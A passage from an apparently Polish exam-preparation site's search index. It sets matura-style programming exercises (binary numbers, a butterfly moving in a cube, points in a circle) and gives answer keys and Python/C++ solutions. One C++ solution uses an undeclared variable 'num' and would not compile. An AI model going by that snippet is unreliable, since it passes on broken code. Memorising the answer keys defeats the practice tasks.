binary\n\n        if decimal &gt; max_dec:\n            max_dec = decimal\n            max_bin = binary\n\n    return min_bin, max_bin\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-9","title":"Zadanie 9","text":"Rozwi\u0105zanie 1Rozwi\u0105zanie 2 <pre><code>def count_unique(binary_numbers_list):\n    dict_counter = dict()\n    for binary in binary_numbers_list:\n        dict_counter[binary] = 1  # Przypisujemy dowoln\u0105 warto\u015b\u0107, \u017ceby doda\u0107 liczb\u0119 do s\u0142ownika\n\n    return len(dict_counter)  # Zwracamy d\u0142ugo\u015b\u0107 s\u0142ownika\n</code></pre> <pre><code>def count_unique(binary_numbers_list):\n    set_counter = set()  # Zbi\u00f3r unikalnych warto\u015bci\n    for binary in binary_numbers_list:\n        set_counter.add(binary)  # Dopisujemy liczb\u0119 binarn\u0105 do zbioru\n\n    return len(set_counter)  # Zwracamy d\u0142ugo\u015b\u0107 zbioru\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-10","title":"Zadanie 10","text":"<pre><code>def count_4_rest(binary_numbers_list):\n    dict_counter = dict()\n    # Tworzymy s\u0142ownik licznik\u00f3w, kt\u00f3ry inicjalizujemy r\u00f3\u017cnymi ko\u0144c\u00f3wkami liczb binarnych, kt\u00f3re odpowiadaj\u0105 kolejnym resztom z dzielenia przez 4\n    dict_counter[\"00\"] = 0\n    dict_counter[\"01\"] = 0\n    dict_counter[\"10\"] = 0\n    dict_counter[\"11\"] = 0\n    for binary in binary_numbers_list:\n        dict_counter[binary[-2] + binary[-1]] += 1  # Zwi\u0119kszamy odpowiedni licznik\n\n    return dict_counter[\"00\"], dict_counter[\"01\"], dict_counter[\"10\"], dict_counter[\"11\"]\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-11","title":"Zadanie 11","text":"<pre><code>def count_1_on_odds(binary_numbers_list):\n    count = 0\n    for binary in binary_numbers_list:\n        correct = True\n        for pos in range(len(binary)):\n            if (pos + 1) % 2 == 0 and binary[pos] == \"1\":  # Sprawdzamy, czy jedynka pojawi\u0142a si\u0119 na parzystej pozycji\n                correct = False\n                break\n\n        if correct:\n            count += 1\n\n    return count\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/binary-numbers/solution-python/#zadanie-12","title":"Zadanie 12","text":"<pre><code>def find_longest_growing_substring(binary_numbers_list):\n    max_length = 1  # D\u0142ugo\u015b\u0107 najd\u0142u\u017cszego podci\u0105gu rosn\u0105cego\n    max_first_index = 0  # Indeks pierwszej warto\u015bci w najd\u0142u\u017cszym podci\u0105gu rosn\u0105cym\n\n    current_length = 1  # D\u0142ugo\u015b\u0107 obecnie obliczanego ci\u0105gu\n    current_first_index = 0  # Indeks pierwszej warto\u015bci w obecnie obliczanym ci\u0105gu\n\n    for index in range(1, len(binary_numbers_list)):\n        # Por\u00f3wnujemy obecn\u0105 warto\u015b\u0107 z poprzedni\u0105\n        if int(binary_numbers_list[index], 2) &gt; int(binary_numbers_list[index - 1], 2):\n            current_length += 1\n        else:\n            current_length = 1\n            current_first_index = index\n\n        if current_length &gt; max_length:\n            max_length = current_length\n            max_first_index = current_first_index\n\n    print(\"D\u0142ugo\u015b\u0107:\", max_length)\n    print(\"Indeks pierwszego el.:\", max_first_index)\n    print(\"Indeks ostatniego el.:\", max_first_index + max_length - 1)\n    max_last_index = max_first_index + max_length\n    print(binary_numbers_list[max_first_index:max_last_index])\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/","title":"Motylek","text":"<p>Wyobra\u017a sobie ma\u0142ego motylka, zamkni\u0119tego w sze\u015bcianie o wymiarach \\(16\\times 16\\times 16\\). Motylek pocz\u0105tkowo znajduje si\u0119 w punkcie o wsp\u00f3\u0142rz\u0119dnych \\((0,0,0)\\). Punkt ten stanowi tak\u017ce \u015brodek sze\u015bcianu. Kraw\u0119dzie sze\u015bcianu s\u0105 r\u00f3wnoleg\u0142e do poszczeg\u00f3lnych osi wsp\u00f3\u0142rz\u0119dnych. Motylek mo\u017ce porusza\u0107 si\u0119 w dowolnym z sze\u015bciu kierunk\u00f3w: do przodu, do ty\u0142u, w g\u00f3r\u0119, w d\u00f3\u0142, w lewo, w prawo. Ka\u017cdy ruch przemieszcza motylka o \\(1\\) w zadanym kierunku. Dok\u0142adniej m\u00f3wi\u0105c, je\u017celi motylek znajduje si\u0119 w punkcie \\((0,0,0)\\), to po pofruni\u0119ciu do przodu znajdzie si\u0119 w punkcie \\((0,0,1)\\). Podobnie, gdyby z nowej pozycji pofrun\u0105\u0142 do ty\u0142u, to ponownie znajdzie si\u0119 na pozycji \\((0,0,0)\\). Podczas swojego lotu motylek nie obraca si\u0119, co oznacza, \u017ce zawsze jest skierowany w tym samym kierunku.</p> <p>W pliku motylek.txt znajduje si\u0119 \\(1000\\) polece\u0144 dla motylka. Ka\u017cde polecenie znajduje si\u0119 w osobnej linii i sk\u0142ada si\u0119 dok\u0142adnie z jednej wielkiej litery alfabetu angielskiego. W zadaniach polecenia numerujemy od jedynki. Polecenia interpretujemy zgodnie z poni\u017cszym schematem:</p> <ul> <li>L - pofru\u0144 w lewo,</li> <li>R - pofru\u0144 w prawo,</li> <li>U - pofru\u0144 do g\u00f3ry,</li> <li>D - pofru\u0144 w d\u00f3\u0142,</li> <li>F - pofru\u0144 naprz\u00f3d,</li> <li>B - pofru\u0144 do ty\u0142u.</li> </ul> <p> motylek.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj numer polecenia, kt\u00f3rego wykonanie spowoduje, \u017ce motylek wyleci poza sze\u015bcian (dopuszczamy wlecenie w bok sze\u015bcianu). Podaj pozycj\u0119, na kt\u00f3rej znajdowa\u0142 si\u0119 motylek przed wykonaniem tego polecenia.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/#zadanie-2","title":"Zadanie 2","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce gdy motylek mia\u0142by wykona\u0107 polecenie, kt\u00f3re poprowadzi\u0142oby go poza sze\u015bcian, to takie polecenie zignoruje (nie zmieni swojej pozycji) i przejdzie do kolejnego. Jak\u0105 \u0142\u0105czn\u0105 odleg\u0142o\u015b\u0107 motylek pokona w trakcie swojej podr\u00f3\u017cy? Na jakiej pozycji znajdzie si\u0119 na ko\u0144cu w\u0119dr\u00f3wki?</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj d\u0142ugo\u015b\u0107 najd\u0142u\u017cszej sekwencji kolejnych polece\u0144, w trakcie wykonywania kt\u00f3rych motylek nie wyleci z sze\u015bcianu (podobnie jak wcze\u015bniej, ignorujemy polecenia, kt\u00f3re mia\u0142yby wyprowadzi\u0107 motylka poza sze\u015bcian, ale przerywaj\u0105 one sekwencj\u0119). Podaj numer pierwszego i ostatniego polecenia z tej sekwencji. Je\u017celi jest kilka takich sekwencji, odwo\u0142aj si\u0119 do pierwszej z nich.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/#zadanie-4","title":"Zadanie 4","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce gdy motylek mia\u0142by wykona\u0107 polecenie przenosz\u0105ce go poza sze\u015bcian, to zamiast tego \"teleportuje\" si\u0119 do punktu \\((0,0,0)\\) i kontynuuje wykonywanie polece\u0144 z tej pozycji, poczynaj\u0105c od polecenia, kt\u00f3re wyprowadzi\u0142oby go poza sze\u015bcian. Oblicz, ile razy motylek b\u0119dzie \"teleportowa\u0142\" si\u0119 do \u015brodka sze\u015bcianu.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/#zadanie-5","title":"Zadanie 5","text":"<p>Ignoruj\u0105c sze\u015bcian i zak\u0142adaj\u0105c, \u017ce motylek wykonuje ka\u017cde polecenie, podaj wsp\u00f3\u0142rz\u0119dne dw\u00f3ch pozycji motylka, kt\u00f3re s\u0105 od siebie najbardziej oddalone w linii prostej. Podaj odleg\u0142o\u015b\u0107 mi\u0119dzy tymi punktami z zaokr\u0105gleniem do dw\u00f3ch miejsc po przecinku. Je\u017celi jest kilka takich par, wypisz wszystkie.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/answers/#zadanie-1","title":"Zadanie 1","text":"<ul> <li>Polecenie: \\(212\\)</li> <li>Pozycja: \\((-1, -8, -6)\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/answers/#zadanie-2","title":"Zadanie 2","text":"<ul> <li>Odleg\u0142o\u015b\u0107: \\(956\\)</li> <li>Pozycja: \\((8, 6, -8)\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/answers/#zadanie-3","title":"Zadanie 3","text":"<ul> <li>D\u0142ugo\u015b\u0107 sekwencji: \\(212\\)</li> <li>Pocz\u0105tek sekwencji: \\(1\\)</li> <li>Koniec sekwencji: \\(212\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/answers/#zadanie-4","title":"Zadanie 4","text":"<p>Teleportacje: \\(9\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/answers/#zadanie-5","title":"Zadanie 5","text":"<ul> <li>Wsp\u00f3\u0142rz\u0119dne: \\((0, 0, 0)\\), \\((-17, 17, -6)\\)</li> <li>Odleg\u0142o\u015b\u0107: \\(24.78\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/solutions/#zadanie-1","title":"Zadanie 1","text":"PythonC++ <pre><code>movement = {\"L\": (-1, 0, 0),\n            \"R\": (1, 0, 0),\n            \"U\": (0, 1, 0),\n            \"D\": (0, -1, 0),\n            \"F\": (0, 0, 1),\n            \"B\": (0, 0, -1)}\nside = 8\nwith open(\"motylek.txt\", \"r\") as file:\n    x, y, z = (0, 0, 0)\n    moves = file.read().split()\n    for num, move in enumerate(moves):\n        xm, ym, zm = movement[move]\n        x += xm\n        y += ym\n        z += zm\n        if not (-side &lt;= x &lt;= side and -side &lt;= y &lt;= side and -side &lt;= z &lt;= side):\n            print(num + 1)\n            print(x - xm, y - ym, z - zm)\n            break\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main() {\n    map&lt;string, tuple&lt;int, int, int&gt;&gt; movement = {\n        {\"L\", {-1, 0, 0}},\n        {\"R\", {1, 0, 0}},\n        {\"U\", {0, 1, 0}},\n        {\"D\", {0, -1, 0}},\n        {\"F\", {0, 0, 1}},\n        {\"B\", {0, 0, -1}}\n    };\n\n    int side = 8;\n    ifstream file(\"motylek.txt\");\n\n    int x = 0, y = 0, z = 0;\n    string move;\n\n    while(file &gt;&gt; move &amp;&amp; !file.eof()) {\n        auto [xm, ym, zm] = movement[move];\n        x += xm;\n        y += ym;\n        z += zm;\n\n        if (!( -side &lt;= x &amp;&amp; x &lt;= side &amp;&amp; -side &lt;= y &amp;&amp; y &lt;= side &amp;&amp; -side &lt;= z &amp;&amp; z &lt;= side)) {\n            cout &lt;&lt; num + 1 &lt;&lt; endl;\n            cout &lt;&lt; x - xm &lt;&lt; \" \" &lt;&lt; y - ym &lt;&lt; \" \" &lt;&lt; z - zm &lt;&lt; endl;\n            break;\n        }\n    }\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/solutions/#zadanie-2","title":"Zadanie 2","text":"PythonC++ <pre><code>movement = {\"L\": (-1, 0, 0),\n            \"R\": (1, 0, 0),\n            \"U\": (0, 1, 0),\n            \"D\": (0, -1, 0),\n            \"F\": (0, 0, 1),\n            \"B\": (0, 0, -1)}\nside = 8\nresult = 0\nwith open(\"motylek.txt\") as file:\n    x, y, z = (0, 0, 0)\n    moves = file.read().split()\n    for num, move in enumerate(moves):\n        xm, ym, zm = movement[move]\n        x += xm\n        y += ym\n        z += zm\n        if not (-side &lt;= x &lt;= side and -side &lt;= y &lt;= side and -side &lt;= z &lt;= side):\n            x -= xm\n            y -= ym\n            z -= zm\n        else:\n            result += 1\n\n    print(result)\n    print(x, y, z)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main() {\n    map&lt;string, tuple&lt;int, int, int&gt;&gt; movement = {\n        {\"L\", {-1, 0, 0}},\n        {\"R\", {1, 0, 0}},\n        {\"U\", {0, 1, 0}},\n        {\"D\", {0, -1, 0}},\n        {\"F\", {0, 0, 1}},\n        {\"B\", {0, 0, -1}}\n    };\n\n    int side = 8;\n    ifstream file(\"motylek.txt\");\n\n    int x = 0, y = 0, z = 0, result = 0;\n    string move;\n\n    while(file &gt;&gt; move &amp;&amp; !file.eof()) {\n        auto [xm, ym, zm] = movement[move];\n        x += xm;\n        y += ym;\n        z += zm;\n\n        if (!( -side &lt;= x &amp;&amp; x &lt;= side &amp;&amp; -side &lt;= y &amp;&amp; y &lt;= side &amp;&amp; -side &lt;= z &amp;&amp; z &lt;= side)) {\n            x -= xm;\n            y -= ym;\n            z -= zm;\n        } else {\n            ++result;\n        }\n    }\n\n    file.close();\n\n    cout &lt;&lt; result &lt;&lt; endl;\n    cout &lt;&lt; x &lt;&lt; \" \" &lt;&lt; y &lt;&lt; \" \" &lt;&lt; z &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/solutions/#zadanie-3","title":"Zadanie 3","text":"PythonC++ <pre><code>movement = {\"L\": (-1, 0, 0),\n            \"R\": (1, 0, 0),\n            \"U\": (0, 1, 0),\n            \"D\": (0, -1, 0),\n            \"F\": (0, 0, 1),\n            \"B\": (0, 0, -1)}\nside = 8\nmin_num = 0\nmax_num = 0\ncurrent_length = 1\nmax_length = 1\nwith open(\"motylek.txt\") as file:\n    x, y, z = (0, 0, 0)\n    moves = file.read().split()\n    for num, move in enumerate(moves):\n        xm, ym, zm = movement[move]\n        x += xm\n        y += ym\n        z += zm\n        if not (-side &lt;= x &lt;= side and -side &lt;= y &lt;= side and -side &lt;= z &lt;= side):\n            x -= xm\n            y -= ym\n            z -= zm\n\n            current_length = 1\n        else:\n            current_length += 1\n\n        if current_length &gt; max_length:\n            max_length = current_length\n            max_num = num + 1\n            min_num = max_num - max_length + 1\n\n    print(max_length)\n    print(min_num, max_num)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main() {\n    map&lt;string, tuple&lt;int, int, int&gt;&gt; movement = {\n        {\"L\", {-1, 0, 0}},\n        {\"R\", {1, 0, 0}},\n        {\"U\", {0, 1, 0}},\n        {\"D\", {0, -1, 0}},\n        {\"F\", {0, 0, 1}},\n        {\"B\", {0, 0, -1}}\n    };\n\n    int side = 8;\n    ifstream file(\"motylek.txt\");\n\n    int x = 0, y = 0, z = 0;\n    int num = 0, min_num = 0, max_num = 0, current_length = 1, max_length = 1;\n    string move;\n\n    while(file &gt;&gt; move &amp;&amp; !file.eof()) {\n        ++num;\n        auto [xm, ym, zm] = movement[move];\n        x += xm;\n        y += ym;\n        z += zm;\n\n        if (!( -side &lt;= x &amp;&amp; x &lt;= side &amp;&amp; -side &lt;= y &amp;&amp; y &lt;= side &amp;&amp; -side &lt;= z &amp;&amp; z &lt;= side)) {\n            x -= xm;\n            y -= ym;\n            z -= zm;\n\n            current_length = 1;\n        } else {\n            current_length += 1;\n        }\n\n        if (current_length &gt; max_length) {\n                max_length = current_length;\n                max_num = num;\n                min_num = max_num - max_length + 1;\n            }\n    }\n\n    file.close();\n\n    cout &lt;&lt; max_length &lt;&lt; endl;\n    cout &lt;&lt; min_num &lt;&lt; \" \" &lt;&lt; max_num &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/solutions/#zadanie-4","title":"Zadanie 4","text":"PythonC++ <pre><code>movement = {\"L\": (-1, 0, 0),\n            \"R\": (1, 0, 0),\n            \"U\": (0, 1, 0),\n            \"D\": (0, -1, 0),\n            \"F\": (0, 0, 1),\n            \"B\": (0, 0, -1)}\nside = 8\nresult = 0\nwith open(\"motylek.txt\") as file:\n    x, y, z = (0, 0, 0)\n    moves = file.read().split()\n    for num, move in enumerate(moves):\n        xm, ym, zm = movement[move]\n        x += xm\n        y += ym\n        z += zm\n        if not (-side &lt;= x &lt;= side and -side &lt;= y &lt;= side and -side &lt;= z &lt;= side):\n            x = xm\n            y = ym\n            z = zm\n            result += 1\n\n    print(result)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main() {\n    map&lt;string, tuple&lt;int, int, int&gt;&gt; movement = {\n        {\"L\", {-1, 0, 0}},\n        {\"R\", {1, 0, 0}},\n        {\"U\", {0, 1, 0}},\n        {\"D\", {0, -1, 0}},\n        {\"F\", {0, 0, 1}},\n        {\"B\", {0, 0, -1}}\n    };\n\n    int side = 8;\n    ifstream file(\"motylek.txt\");\n\n    int x = 0, y = 0, z = 0, result = 0;\n    string move;\n\n    while(file &gt;&gt; move &amp;&amp; !file.eof()) {\n        auto [xm, ym, zm] = movement[move];\n        x += xm;\n        y += ym;\n        z += zm;\n\n        if (!( -side &lt;= x &amp;&amp; x &lt;= side &amp;&amp; -side &lt;= y &amp;&amp; y &lt;= side &amp;&amp; -side &lt;= z &amp;&amp; z &lt;= side)) {\n            x = xm;\n            y = ym;\n            z = zm;\n            ++result;\n        }\n    }\n\n    file.close();\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/butterfly/solutions/#zadanie-5","title":"Zadanie 5","text":"PythonC++ <pre><code>movement = {\"L\": (-1, 0, 0),\n            \"R\": (1, 0, 0),\n            \"U\": (0, 1, 0),\n            \"D\": (0, -1, 0),\n            \"F\": (0, 0, 1),\n            \"B\": (0, 0, -1)}\npositions = [(0, 0, 0)]\nwith open(\"motylek.txt\") as file:\n    x, y, z = (0, 0, 0)\n    moves = file.read().split()\n    for num, move in enumerate(moves):\n        xm, ym, zm = movement[move]\n        x += xm\n        y += ym\n        z += zm\n        positions.append((x, y, z))\n\nmax_dist = 0\np1 = (0,0,0)\np2 = (0,0,0)\nfor i in range(len(positions)):\n    for j in range(i + 1, len(positions)):\n        x1, y1, z1 = positions[i]\n        x2, y2, z2 = positions[j]\n        dist = (x1-x2)**2 + (y1-y2)**2 + (z1-z2)**2\n        if dist &gt; max_dist:\n            max_dist = dist\n            p1 = positions[i]\n            p2 = positions[j]\n\nprint(p1, p2)\nprint(f\"{(max_dist**0.5):.2f}\")\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;iomanip&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;map&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nint main() {\n    map&lt;string, tuple&lt;int, int, int&gt;&gt; movement = {\n        {\"L\", {-1, 0, 0}},\n        {\"R\", {1, 0, 0}},\n        {\"U\", {0, 1, 0}},\n        {\"D\", {0, -1, 0}},\n        {\"F\", {0, 0, 1}},\n        {\"B\", {0, 0, -1}}\n    };\n\n    ifstream file(\"motylek.txt\");\n\n    int x = 0, y = 0, z = 0;\n    string move;\n    vector&lt;tuple&lt;int, int, int&gt;&gt; positions;\n    positions.push_back({0, 0, 0});\n\n    while(file &gt;&gt; move &amp;&amp; !file.eof()) {\n        auto [xm, ym, zm] = movement[move];\n        x += xm;\n        y += ym;\n        z += zm;\n        positions.push_back({x, y, z});\n    }\n\n    file.close();\n\n    int max_dist = 0;\n    tuple&lt;int, int, int&gt; p1 = {0, 0, 0}, p2 = {0, 0, 0};\n\n    for(int i = 0; i &lt; positions.size(); ++i) {\n        for(int j = i + 1; j &lt; positions.size(); ++j) {\n            auto [x1, y1, z1] = positions[i];\n            auto [x2, y2, z2] = positions[j];\n            int dist = (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2) + (z1 - z2) * (z1 - z2);\n            if (dist &gt; max_dist) {\n                max_dist = dist;\n                p1 = positions[i];\n                p2 = positions[j];\n            }\n        }\n    }\n\n    cout &lt;&lt; get&lt;0&gt;(p1) &lt;&lt; \" \" &lt;&lt; get&lt;1&gt;(p1) &lt;&lt; \" \" &lt;&lt; get&lt;2&gt;(p1) &lt;&lt; endl;\n    cout &lt;&lt; get&lt;0&gt;(p2) &lt;&lt; \" \" &lt;&lt; get&lt;1&gt;(p2) &lt;&lt; \" \" &lt;&lt; get&lt;2&gt;(p2) &lt;&lt; endl;\n    cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; sqrt(max_dist) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/","title":"K\u00f3\u0142ko i kwadrat","text":"<p>W pliku kik.txt znajduje si\u0119 \\(10000\\) par liczb rzeczywistych z zakresu od \\(-1\\) do \\(1\\). Ka\u017cda linia w pliku zawiera dwie liczby oddzielone spacj\u0105. Liczby s\u0105 zapisane w formacie angielskim, tzn. cz\u0119\u015b\u0107 ca\u0142kowit\u0105 od u\u0142amkowej oddziela kropka. Ka\u017cd\u0105 par\u0119 interpretujemy jako wsp\u00f3\u0142rz\u0119dne punktu w uk\u0142adzie wsp\u00f3\u0142rz\u0119dnych.</p> <p>W \u015brodku uk\u0142adu wsp\u00f3\u0142rz\u0119dnych narysowano ko\u0142o o promieniu \\(1\\). \u015arodek ko\u0142a znajduje si\u0119 w punkcie \\((0,0)\\).</p> <p> kik.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/#zadanie-1","title":"Zadanie 1","text":"<p>Oblicz, ile punkt\u00f3w z pliku znajduje si\u0119 wewn\u0105trz ko\u0142a (wliczamy w to tak\u017ce punkty le\u017c\u0105ce na okr\u0119gu), a ile poza nim.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/#zadanie-2","title":"Zadanie 2","text":"<p>Znajd\u017a d\u0142ugo\u015b\u0107 najd\u0142u\u017cszej sekwencji kolejnych, s\u0105siednich punkt\u00f3w, z kt\u00f3rych ka\u017cdy znajduje si\u0119 wewn\u0105trz ko\u0142a (lub na jego okr\u0119gu).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj dowoln\u0105 warto\u015b\u0107 \\(k\\) tak\u0105, \u017ce dok\u0142adnie \\(5000\\) punkt\u00f3w ma wsp\u00f3\u0142rz\u0119dn\u0105 \\(x\\) mniejsz\u0105 od \\(k\\), a pozosta\u0142e punkty maj\u0105 wsp\u00f3\u0142rz\u0119dn\u0105 \\(x\\) wi\u0119ksz\u0105 od \\(k\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/#zadanie-4","title":"Zadanie 4","text":"<p>We\u017a pierwsze \\(100\\) punkt\u00f3w z pliku. Ka\u017cd\u0105 wsp\u00f3\u0142rz\u0119dn\u0105 pomn\u00f3\u017c przez \\(1000\\) i zaokr\u0105glij \\(w d\u00f3\u0142\\) do najbli\u017cszej liczby ca\u0142kowitej. Zapisz tak otrzymane punkty w pliku kik_posortowane.txt, ka\u017cdy w osobnej linii, uporz\u0105dkowane zgodnie z poni\u017cszymi regu\u0142ami:</p> <ul> <li>za\u0142\u00f3\u017cmy, \u017ce ustalamy porz\u0105dek dw\u00f3ch punkt\u00f3w o wsp\u00f3\u0142rz\u0119dnych \\((x_1,y_1)\\) i \\((x_2,y_2)\\),</li> <li>punkt \\((x_1,y_1)\\) znajduje si\u0119 w porz\u0105dku przed punktem \\((x_2,y_2)\\) wtedy i tylko wtedy gdy:</li> <li>\\(x_1&lt;x_2\\) lub</li> <li>\\(x_1=x_2\\) oraz \\(y_1&lt;=y_2\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/answers/#zadanie-1","title":"Zadanie 1","text":"<ul> <li>Punkty w kole: \\(8136\\)</li> <li>Punkty poza ko\u0142em: \\(1864\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/answers/#zadanie-2","title":"Zadanie 2","text":"<p>D\u0142ugo\u015b\u0107 sekwencji: \\(43\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/answers/#zadanie-3","title":"Zadanie 3","text":"<p>Przyk\u0142adowa warto\u015b\u0107 \\(k=-0.0028421983934499573\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>-900 -803\n-864 -724\n-859 199\n-855 903\n-854 879\n-822 850\n-775 -474\n-774 869\n-726 496\n-707 -99\n-677 600\n-660 780\n-639 -832\n-633 -375\n-599 -329\n-594 718\n-570 670\n-560 365\n-551 987\n-542 469\n-489 -282\n-487 -362\n-470 -442\n-440 0\n-439 449\n-416 -328\n-406 438\n-400 100\n-396 -563\n-389 -75\n-372 875\n-364 371\n-325 619\n-322 -321\n-320 820\n-300 -825\n-284 -22\n-265 250\n-238 -290\n-235 -896\n-201 -900\n-195 -254\n-140 -249\n-140 -69\n-137 100\n-131 -811\n-114 243\n-100 -612\n-93 -440\n-69 309\n-52 -770\n-26 -861\n-6 -176\n115 -199\n119 678\n126 145\n197 -5\n300 152\n300 495\n303 -812\n310 234\n329 673\n351 260\n354 896\n355 290\n359 -673\n369 776\n379 300\n380 -468\n381 -572\n400 -282\n400 348\n409 -301\n432 868\n435 -21\n446 776\n453 -477\n500 669\n513 800\n514 815\n526 315\n566 241\n579 -214\n586 -687\n589 364\n600 713\n629 -579\n657 990\n661 -415\n737 -483\n799 199\n800 691\n800 819\n800 921\n830 794\n878 167\n920 -345\n924 373\n925 -465\n927 -510\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/solutions/#zadanie-1","title":"Zadanie 1","text":"PythonC++ <pre><code>with open(\"kik.txt\") as file:\n    points = [list(map(float, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n\ninside = 0\noutside = 0\nfor point in points:\n    x = point[0]\n    y = point[1]\n    dist = x * x + y * y\n    if dist &lt;= 1:\n        inside += 1\n    else:\n        outside += 1\n\nprint(f\"inside: {inside}, outside: {outside}\")\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"kik.txt\");\n    double x, y, dist;\n    int inside = 0, outside = 0;\n    for(int i = 0; i &lt; 10000; i++) {\n        file &gt;&gt; x &gt;&gt; y;\n        dist = x * x + y * y;\n        if(dist &lt;= 1) {\n            inside++;\n        } else {\n            outside++;\n        }\n    }\n\n    cout &lt;&lt; \"inside: \" &lt;&lt; inside &lt;&lt; endl;\n    cout &lt;&lt; \"outside: \" &lt;&lt; outside &lt;&lt; endl;\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/solutions/#zadanie-2","title":"Zadanie 2","text":"PythonC++ <pre><code>with open(\"kik.txt\") as file:\n    points = [list(map(float, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n\nmax_length = 0\ncurrent_length = 0\nfor point in points:\n    x = point[0]\n    y = point[1]\n    dist = x * x + y * y\n    if dist &lt;= 1:\n        current_length += 1\n        max_length = max(current_length, max_length)\n    else:\n        current_length = 0\n\nprint(max_length)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"kik.txt\");\n    double x, y, dist;\n    int max_length = 0, current_length = 0;\n    for(int i = 0; i &lt; 10000; i++) {\n        file &gt;&gt; x &gt;&gt; y;\n        dist = x * x + y * y;\n        if(dist &lt;= 1) {\n            current_length++;\n            if(current_length &gt; max_length) {\n                max_length = current_length;\n            }\n        } else {\n            current_length = 0;\n        }\n    }\n\n    cout &lt;&lt; max_length &lt;&lt; endl;\n\n    file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/solutions/#zadanie-3","title":"Zadanie 3","text":"PythonC++ <pre><code>with open(\"kik.txt\") as file:\n    points = [list(map(float, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n\nxs = [point[0] for point in points]\nxs.sort()\nprint(((xs[len(xs) // 2] - xs[len(xs) // 2 - 1]) / 2) + xs[len(xs) // 2 - 1])\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"kik.txt\");\n    double x, y;\n    double xs[10000];\n    for(int i = 0; i &lt; 10000; i++) {\n        file &gt;&gt; x &gt;&gt; y;\n        xs[i] = x;\n    }\n\n    file.close();\n\n    sort(xs, xs + 10000);\n\n    cout &lt;&lt; ((xs[5000] - xs[4999]) / 2) + xs[4999] &lt;&lt; endl;\n\n    return 